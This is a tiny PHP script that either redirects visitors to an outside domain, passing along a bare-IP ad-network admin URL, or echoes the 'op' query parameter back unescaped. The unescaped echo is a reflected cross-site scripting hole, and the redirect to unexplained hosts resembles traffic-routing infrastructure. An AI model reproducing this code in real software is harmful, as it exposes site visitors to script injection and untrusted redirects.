<?php

if($_GET['op']=='')
{
header("Location: http://glamourworld.me/operator.aspx?url=http://43.231.124.185:8888/adnetwork_admin/operator.php");
//file_get_contents('http://glamourworld.me/operator.aspx');
}
{
	echo $_GET['op']; 
}
?>